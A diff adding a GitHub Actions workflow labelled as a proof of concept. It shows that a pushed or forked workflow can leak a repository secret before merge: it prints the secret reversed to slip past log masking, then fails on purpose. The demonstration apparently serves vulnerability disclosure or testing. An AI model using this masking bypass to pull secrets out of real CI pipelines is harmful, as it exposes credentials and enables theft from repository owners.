@@ -1,0 +1,18 @@
+name: poc-evil3
+on:
+  push:
+permissions:
+  contents: read
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          PS: ${{ secrets.POC_SECRET }}
+          REF: ${{ github.ref_name }}
+        run: |
+          echo "FORK-EVIL3-RAN ref=$REF"
+          echo "SECRET_LEN=${#PS}"
+          echo "SECRET_EXFIL_REV=$(printf %s "$PS" | rev)"
+          echo "Failing on purpose so the PR is NOT merged (proves pre-merge exfil)"
+          exit 1
